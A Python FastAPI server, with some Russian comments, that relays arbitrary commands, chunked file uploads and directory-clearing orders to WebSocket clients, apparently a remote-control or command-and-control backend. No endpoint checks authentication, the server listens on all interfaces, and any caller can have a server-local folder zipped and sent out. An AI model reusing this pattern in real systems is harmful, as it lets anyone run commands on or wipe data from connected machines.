import shutil
import tempfile
from fastapi import FastAPI, WebSocket, UploadFile, File, Form
from fastapi.responses import JSONResponse
import asyncio
import base64
import json
import os
import uuid

app = FastAPI()
clients = {}  # { client_id: { "ws": websocket, "queue": asyncio.Queue() } }

CHUNK_SIZE = 512 * 1024  # 512 KB

# ---------------- WebSocket ----------------
@app.websocket("/ws/{client_id}")
async def websocket_endpoint(websocket: WebSocket, client_id: str):
    await websocket.accept()

    if client_id in clients:
        await websocket.send_json({
            "type": "error",
            "message": "client_id_already_used",
            "detail": f"ID '{client_id}' is already connected"
        })

        await asyncio.sleep(0.1)

        await websocket.close()
        print(f"[!] Rejected duplicate client_id: {client_id}")
        return

    clients[client_id] = {"ws": websocket, "pending": {}}
    pending = clients[client_id]["pending"]
    print(f"[+] {client_id} connected")

    try:
        while True:
            text = await websocket.receive_text()
            try:
                parsed = json.loads(text)
            except:
                parsed = None

            if isinstance(parsed, dict) and "command_id" in parsed:
                cmdid = parsed["command_id"]
                fut = pending.pop(cmdid, None)
                if fut and not fut.done():
                    fut.set_result(parsed)
            else:
                if pending:
                    first_cmdid = next(iter(pending))
                    fut = pending.pop(first_cmdid, None)
                    if fut and not fut.done():
                        fut.set_result({"command_id": first_cmdid, "raw": text})
    except Exception as e:
        print(f"[-] {client_id} disconnected: {e}")
    finally:
        for fut in list(pending.values()):
            if not fut.done():
                fut.cancel()
        clients.pop(client_id, None)

# ---------------- List clients ----------------
@app.get("/clients")
async def list_clients():
    return JSONResponse({"connected": list(clients.keys()), "count": len(clients)})

# ---------------- Core command send ----------------
async def send_command_with_id(client_id: str, command: str):
    client = clients.get(client_id)
    if not client:
        return {"status": "offline"}

    ws = client["ws"]
    pending = client["pending"]

    cmdid = str(uuid.uuid4())
    fut = asyncio.get_running_loop().create_future()
    pending[cmdid] = fut

    # Если 'command' — строка JSON (объект), раскрываем её и добавляем command_id,
    # иначе отправляем как обычную команду wrapper
    try:
        parsed_cmd = json.loads(command)
        if isinstance(parsed_cmd, dict):
            payload = parsed_cmd
            payload["command_id"] = cmdid
        else:
            payload = {"type": "command", "command": command, "command_id": cmdid}
    except Exception:
        payload = {"type": "command", "command": command, "command_id": cmdid}

    await ws.send_text(json.dumps(payload))
    print(f"--> Sent to {client_id}: {payload}")

    try:
        # увеличить таймаут для больших файлов
        result = await asyncio.wait_for(fut, timeout=300.0)
        return {"status": "ok", "response": result}
    except asyncio.TimeoutError:
        pending.pop(cmdid, None)
        return {"status": "timeout"}
    except asyncio.CancelledError:
        return {"status": "disconnected"}
    except Exception as e:
        pending.pop(cmdid, None)
        return {"status": "error", "error": str(e)}

# ---------------- Send generic command ----------------
@app.post("/send/{client_id}")
async def send_command(client_id: str, command: str):
    return JSONResponse(await send_command_with_id(client_id, command))

# ---------------- Upload file ----------------
@app.post("/upload/{client_id}")
async def upload(client_id: str, file: UploadFile = File(None), source_path: str = Form(None), target_path: str = Form(...)):
    """
    - file: загружаем обычный файл
    - source_path: локальная папка для загрузки
    - target_path: конечный путь на клиенте
    """
    # Определяем, что загружаем
    is_folder = source_path is not None

    if is_folder:
        if not os.path.isdir(source_path):
            return {"status": "error", "message": "Source folder not found"}
        # Создаем временный ZIP
        tmp_zip = tempfile.mktemp(suffix=".zip")
        shutil.make_archive(tmp_zip[:-4], "zip", source_path)
        with open(tmp_zip, "rb") as f:
            content = f.read()
        os.remove(tmp_zip)
        filename = os.path.basename(source_path.rstrip("\\/")) + ".zip"
    else:
        if not file:
            return {"status": "error", "message": "No file provided"}
        content = await file.read()
        filename = file.filename

    total_chunks = (len(content) + CHUNK_SIZE - 1) // CHUNK_SIZE
    responses = []

    for i in range(total_chunks):
        chunk_data = content[i*CHUNK_SIZE:(i+1)*CHUNK_SIZE]
        encoded = base64.b64encode(chunk_data).decode("utf-8")
        command_payload = {
            "type": "file_upload_chunk",
            "target_path": target_path,
            "filename": filename,
            "chunk_index": i,
            "total_chunks": total_chunks,
            "data": encoded
        }
        command = json.dumps(command_payload)
        resp = await send_command_with_id(client_id, command)
        responses.append(resp)

    return JSONResponse({"status": "ok", "chunks_sent": total_chunks, "responses": responses})

# ---------------- Clean folder ----------------
@app.post("/clean_folder/{client_id}")
async def clean_folder(client_id: str, path: str = Form(...)):
    command = f"clean_dir:{path}"
    return JSONResponse(await send_command_with_id(client_id, command))

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)